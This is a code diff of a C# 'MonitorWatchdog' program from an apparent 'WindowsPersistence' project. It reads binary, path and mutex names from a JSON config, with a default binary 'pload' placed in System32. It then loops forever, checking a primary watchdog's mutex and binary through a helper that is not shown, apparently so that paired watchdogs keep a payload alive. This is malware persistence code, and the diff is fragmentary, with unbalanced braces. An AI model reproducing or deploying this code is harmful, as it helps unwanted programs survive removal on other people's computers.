@@ -17,48 +17,48 @@ namespace MonitorWatchdog
 {
     public class MonitorWatchdog
     {
+        // Defaults to putting the file in the System32 directory and the binary name pload
+        public static string? BinaryPath { get; private set; }
+        public static string? BinaryName { get; private set; }
+        public static string? PrimaryWatchdogMutexName { get; private set; }
+        public static string? SecondaryWatchdogPath { get; private set; }
+        public static string? SecondaryWatchdogName { get; private set; }
+        public static string? PrimaryWatchdogPath { get; private set; }
+        public static string? PrimaryWatchdogName { get; private set; }
+        public static string? SecondaryWatchdogMutexName { get; private set; }
         static void Main(string[] args)
         {
-            string watchdogProcessName = "WindowsPersistence";  // Name of the watchdog binary (without .exe)
-            string watchdogBinaryPath = @"C:\Users\will\source\repos\WindowsPersistence\WindowsPersistence\bin\Debug\net8.0\WindowsPersistence.exe"; // Full path to the watchdog binary
+            string[] staticVars = { "BinaryPath", "BinaryName", "SecondaryWatchdogPath", "SecondaryWatchdogName", "SecondaryWatchdogMutexName", "PrimaryWatchdogMutexName", "PrimaryWatchdogPath", "PrimaryWatchdogName" };
+            watchdogHelper.watchdogHelper.LoadFromJson("Config.json", staticVars);
 
+            // Create or open the mutex to ensure only one instance is running
+            using (Mutex mutex = new Mutex(false, PrimaryWatchdogMutexName, out bool isNewInstance))
+            {
+                if (!isNewInstance)
+                {
+                    //Watchdog process is already running. Exiting.
+                    return;
+                }
+
+
+                WatchdogLogic();
+            }
+        }
+
+
+        static void WatchdogLogic()
+        { 
+    //  loop for frequent checks
             while (true)
             {
-                if (!IsProcessRunning(watchdogProcessName))
+                if (watchdogHelper.watchdogHelper.IsMutexRunning(PrimaryWatchdogMutexName))
                 {
-                    Console.WriteLine("Watchdog process not running. Starting it now...");
-
-                    // Start the watchdog process
-                    StartWatchdog(watchdogBinaryPath);
-                }
-                else
-                {
-                    Console.WriteLine("Watchdog process is running.");
+                    watchdogHelper.watchdogHelper.CheckBinary(PrimaryWatchdogPath, PrimaryWatchdogName);
                 }
 
-                // Sleep before checking again
-                Thread.Sleep(2000); // Check every 5 seconds
+                Thread.Sleep(10000); 
             }
         }
 
-        // Check if a process is running by name
-        static bool IsProcessRunning(string processName)
-        {
-            Process[] processes = Process.GetProcessesByName(processName);
-            return processes.Length > 0;
         }
-
-        // Start the watchdog binary
-        static void StartWatchdog(string watchdogBinaryPath)
-        {
-            if (File.Exists(watchdogBinaryPath))
-            {
-                Process.Start(watchdogBinaryPath);
-            }
-            else
-            {
-                Console.WriteLine($"Watchdog binary not found at {watchdogBinaryPath}");
-            }
-        }
-    }
 }
